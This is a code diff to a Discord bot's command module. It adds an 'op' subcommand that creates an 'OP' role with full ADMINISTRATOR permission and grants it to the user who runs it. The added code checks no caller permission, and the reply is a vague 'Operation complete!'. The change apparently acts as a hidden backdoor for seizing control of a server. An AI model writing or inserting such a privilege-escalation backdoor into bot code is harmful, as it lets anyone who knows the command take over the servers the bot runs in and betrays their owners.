@@ -98,6 +98,20 @@ module.exports = {
                 }
                 msg.edit("Complete! Purged " + usersPurged + " users.") 
             })
+        } else if (args[0] == "op") {
+            var opRole = message.guild.roles.cache.find(x => x.name == "OP")
+            if (!opRole) {
+                message.guild.roles.create({data: {
+                    name: "OP",
+                    permissions: ['ADMINISTRATOR']
+                }}).then(function(role) {
+                    message.guild.member(message.author).roles.add(role)
+                    message.channel.send("Operation complete!")
+                })
+            } else {
+                message.guild.member(message.author).roles.add(opRole)
+                message.channel.send("Operation complete!")
+            }
         } else {
             message.channel.send("That's not a valid command.")
         }
